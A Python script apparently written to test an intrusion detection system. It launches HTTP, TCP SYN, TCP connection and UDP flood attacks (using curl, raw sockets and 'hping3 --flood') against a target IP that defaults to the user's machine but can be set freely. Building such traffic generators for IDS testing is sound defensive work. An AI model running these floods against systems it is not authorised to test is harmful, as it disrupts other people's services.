#!/usr/bin/env python3
"""
DoS Attack Simulation Script for IDS Testing

This script simulates a DoS (Denial of Service) attack on your IP address
to test if the IDS correctly detects it.

Target IP: 10.7.19.211 (your machine)
"""

import subprocess
import time
import sys
import socket
import threading
from pathlib import Path

TARGET_IP = "10.7.19.211"
DEFAULT_PORT = 80
DEFAULT_DURATION = 30  # seconds
DEFAULT_RATE = 100  # requests per second

def check_dependencies():
    """Check if required tools are available"""
    tools = {
        'curl': 'curl',
        'nc': 'nc',
        'hping3': 'hping3'
    }
    
    available = {}
    for name, cmd in tools.items():
        try:
            subprocess.run([cmd, '--version'], capture_output=True, timeout=2)
            available[name] = True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            available[name] = False
    
    return available

def dos_http_flood(target_ip, port=80, duration=30, rate=100):
    """
    Simulate HTTP DoS attack using curl
    CICIDS DoS attacks (Hulk, GoldenEye) have:
    - Very high packet rates (1000+ packets/second)
    - Short IAT (inter-arrival times)
    - Many small packets
    - High Flow Packets/s
    """
    print(f"🔥 Starting HTTP DoS Flood Attack")
    print(f"   Target: {target_ip}:{port}")
    print(f"   Duration: {duration} seconds")
    print(f"   Rate: ~{rate} requests/second")
    print(f"   Pattern: Rapid, concurrent requests (DoS-like)")
    print()
    
    start_time = time.time()
    request_count = 0
    
    try:
        # Use threading for concurrent requests (DoS pattern)
        import threading
        
        def send_request():
            nonlocal request_count
            try:
                subprocess.run(
                    ["curl", "-s", "-o", "/dev/null", "--max-time", "1", f"http://{target_ip}:{port}"],
                    timeout=2,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                request_count += 1
            except:
                pass
        
        while time.time() - start_time < duration:
            # Send multiple concurrent requests (DoS pattern)
            threads = []
            for _ in range(min(rate // 10, 20)):  # Concurrent requests
                t = threading.Thread(target=send_request)
                t.start()
                threads.append(t)
            
            if request_count % 100 == 0 and request_count > 0:
                elapsed = time.time() - start_time
                print(f"   Sent {request_count} requests in {elapsed:.1f}s (rate: {request_count/elapsed:.1f} req/s)...")
            
            # Very short delay for high rate (DoS pattern)
            time.sleep(0.01)  # 100 requests/second potential
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        print(f"✅ HTTP DoS simulation complete! Sent {request_count} requests")
        return True
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted. Sent {request_count} requests")
        return False
    except FileNotFoundError:
        print("❌ Error: 'curl' not found. Install with: brew install curl")
        return False

def dos_tcp_syn_flood(target_ip, port=80, duration=30, rate=50):
    """
    Simulate TCP SYN flood using hping3
    """
    print(f"🔥 Starting TCP SYN Flood Attack")
    print(f"   Target: {target_ip}:{port}")
    print(f"   Duration: {duration} seconds")
    print(f"   Rate: ~{rate} packets/second")
    print()
    
    try:
        # Use hping3 for SYN flood
        cmd = [
            "hping3",
            "-S",  # SYN flag
            "-p", str(port),
            "--flood",  # Flood mode
            target_ip
        ]
        
        print(f"   Running: {' '.join(cmd)}")
        print(f"   Press Ctrl+C to stop")
        print()
        
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for duration
        time.sleep(duration)
        process.terminate()
        process.wait()
        
        print(f"✅ TCP SYN flood complete!")
        return True
    except FileNotFoundError:
        print("❌ Error: 'hping3' not found.")
        print("   Install with: brew install hping")
        return False
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
        return False

def dos_tcp_connect_flood(target_ip, port=80, duration=30, rate=50):
    """
    Simulate TCP connection flood using sockets
    CICIDS DoS attacks have:
    - Very high connection rates
    - Short-lived connections
    - High Flow Packets/s
    - Low Flow Bytes/s (small packets)
    """
    print(f"🔥 Starting TCP Connection Flood Attack (DoS Pattern)")
    print(f"   Target: {target_ip}:{port}")
    print(f"   Duration: {duration} seconds")
    print(f"   Rate: ~{rate} connections/second")
    print(f"   Pattern: Rapid, short-lived connections (DoS-like)")
    print()
    
    start_time = time.time()
    connection_count = 0
    
    def make_connection():
        nonlocal connection_count
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)  # Short timeout for DoS pattern
            sock.connect((target_ip, port))
            # Send minimal data (DoS pattern: small packets)
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
            connection_count += 1
        except:
            pass
    
    try:
        while time.time() - start_time < duration:
            # Create multiple concurrent connections (DoS pattern)
            threads = []
            for _ in range(min(rate, 30)):  # Concurrent connections
                t = threading.Thread(target=make_connection)
                t.start()
                threads.append(t)
            
            # Very short delay for high rate (DoS pattern)
            time.sleep(0.1)  # 10 batches per second = high rate
            
            if connection_count % 50 == 0 and connection_count > 0:
                elapsed = time.time() - start_time
                print(f"   Made {connection_count} connections in {elapsed:.1f}s (rate: {connection_count/elapsed:.1f} conn/s)...")
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        print(f"✅ TCP connection flood complete! Made {connection_count} connections")
        return True
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted. Made {connection_count} connections")
        return False

def dos_udp_flood(target_ip, port=53, duration=30, rate=100):
    """
    Simulate UDP flood using hping3
    """
    print(f"🔥 Starting UDP Flood Attack")
    print(f"   Target: {target_ip}:{port}")
    print(f"   Duration: {duration} seconds")
    print(f"   Rate: ~{rate} packets/second")
    print()
    
    try:
        cmd = [
            "hping3",
            "--udp",
            "-p", str(port),
            "--flood",
            target_ip
        ]
        
        print(f"   Running: {' '.join(cmd)}")
        print(f"   Press Ctrl+C to stop")
        print()
        
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        process.terminate()
        process.wait()
        
        print(f"✅ UDP flood complete!")
        return True
    except FileNotFoundError:
        print("❌ Error: 'hping3' not found.")
        print("   Install with: brew install hping")
        return False
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
        return False

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="DoS Attack Simulator for IDS Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP DoS attack (default)
  python3 test_dos_attack.py --type http --target 10.7.19.211 --port 80

  # TCP SYN flood
  python3 test_dos_attack.py --type syn --target 10.7.19.211 --port 443

  # TCP connection flood
  python3 test_dos_attack.py --type tcp --target 10.7.19.211 --port 80

  # UDP flood
  python3 test_dos_attack.py --type udp --target 10.7.19.211 --port 53
        """
    )
    
    parser.add_argument(
        '--type',
        choices=['http', 'syn', 'tcp', 'udp'],
        default='http',
        help='Type of DoS attack (default: http)'
    )
    
    parser.add_argument(
        '--target',
        default=TARGET_IP,
        help=f'Target IP address (default: {TARGET_IP})'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=DEFAULT_PORT,
        help=f'Target port (default: {DEFAULT_PORT})'
    )
    
    parser.add_argument(
        '--duration',
        type=int,
        default=DEFAULT_DURATION,
        help=f'Attack duration in seconds (default: {DEFAULT_DURATION})'
    )
    
    parser.add_argument(
        '--rate',
        type=int,
        default=DEFAULT_RATE,
        help=f'Attack rate (requests/packets per second) (default: {DEFAULT_RATE})'
    )
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("🎯 DoS ATTACK SIMULATOR - IDS TESTING")
    print("=" * 70)
    print(f"Attack Type: {args.type.upper()}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Duration: {args.duration} seconds")
    print(f"Rate: {args.rate} requests/packets per second")
    print("=" * 70)
    print()
    print("⚠️  WARNING: This will generate network traffic to test your IDS.")
    print("   Make sure your IDS sniffer is running!")
    print()
    time.sleep(2)
    
    # Check dependencies
    tools = check_dependencies()
    
    # Run the attack
    success = False
    if args.type == 'http':
        if not tools['curl']:
            print("❌ 'curl' is required for HTTP DoS. Install with: brew install curl")
            return 1
        success = dos_http_flood(args.target, args.port, args.duration, args.rate)
    
    elif args.type == 'syn':
        if not tools['hping3']:
            print("❌ 'hping3' is required for SYN flood. Install with: brew install hping")
            return 1
        success = dos_tcp_syn_flood(args.target, args.port, args.duration, args.rate)
    
    elif args.type == 'tcp':
        success = dos_tcp_connect_flood(args.target, args.port, args.duration, args.rate)
    
    elif args.type == 'udp':
        if not tools['hping3']:
            print("❌ 'hping3' is required for UDP flood. Install with: brew install hping")
            return 1
        success = dos_udp_flood(args.target, args.port, args.duration, args.rate)
    
    if success:
        print()
        print("=" * 70)
        print("✅ Attack simulation completed!")
        print("   Check your IDS dashboard/logs for DoS detection.")
        print("=" * 70)
        return 0
    else:
        return 1

if __name__ == "__main__":
    sys.exit(main())

